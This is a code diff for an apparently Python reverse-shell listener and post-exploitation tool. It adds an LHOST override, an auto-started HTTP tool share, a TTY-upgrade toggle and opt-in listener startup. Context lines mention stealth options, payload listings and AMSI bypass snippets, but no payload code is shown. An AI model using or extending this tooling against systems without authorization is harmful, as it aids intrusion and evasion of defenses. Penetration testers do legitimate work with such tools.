     p.add_argument('--no-upgrade',   action='store_true', help='Disable auto PTY upgrade')
@@ -4075,6 +4366,13 @@ def build_parser():
     p.add_argument('--jitter',       type=int, default=0, help='Jitter (ms) between commands (stealth)')
     p.add_argument('--stealth',      action='store_true', help='Stealth mode: no disk writes on target')
     p.add_argument('--auto-enum',    action='store_true', help='Auto-run QuickEnum on every new session')
+    # v2.2 flags
+    p.add_argument('--lhost',        metavar='IP',   default=None,
+                   help='Override auto-detected LHOST IP')
+    p.add_argument('--auto-share',   action='store_true',
+                   help='Auto-start HTTP share server for tools/ (port 9001-9100)')
+    p.add_argument('--no-auto-tty',  action='store_true',
+                   help='Disable automatic TTY upgrade on new sessions')
     p.add_argument('--windows',      action='store_true', help='Show Windows payloads only')
     p.add_argument('--linux',        action='store_true', help='Show Linux payloads only')
     p.add_argument('--amsi',         action='store_true', help='Show AMSI bypass snippets')
@@ -4259,10 +4557,21 @@ def main():
     options.ports = ports
 
     # ── v2.2: Detect system info (LHOST, shell, terminal) ──────────────────
-    options.lhost_all    = _get_all_local_ips()
-    options.lhost        = options.lhost_all[0] if options.lhost_all else _get_lhost()
-    options.shell_type   = _detect_shell()
-    options.terminal_type= _detect_terminal()
+    options.lhost_all     = _get_all_local_ips()
+    options.shell_type    = _detect_shell()
+    options.terminal_type = _detect_terminal()
+
+    # --lhost flag overrides auto-detection
+    if getattr(args, 'lhost', None):
+        options.lhost = args.lhost
+        if args.lhost not in options.lhost_all:
+            options.lhost_all.insert(0, args.lhost)
+    else:
+        options.lhost = options.lhost_all[0] if options.lhost_all else _get_lhost()
+
+    # --no-auto-tty flag
+    if getattr(args, 'no_auto_tty', False):
+        options.auto_tty = False
 
     print_banner()
 
@@ -4321,9 +4630,12 @@ def main():
     menu = MainMenu()
     menu.set_id(None)
 
-    # -- Start listeners
-    for port in ports:
-        TCPListener(Interfaces().translate(args.interface), port)
+    # -- Start listeners (only if --auto-listen flag is passed)
+    # Auto-listener is disabled by default; use 'payloads' command to generate
+    # payloads + auto-start listener, or use 'listeners add -p <port>' manually.
+    if getattr(args, 'auto_listen', False):
+        for port in ports:
+            TCPListener(Interfaces().translate(args.interface), port)
 
     # -- Connect mode
     target = args.host or args.connect
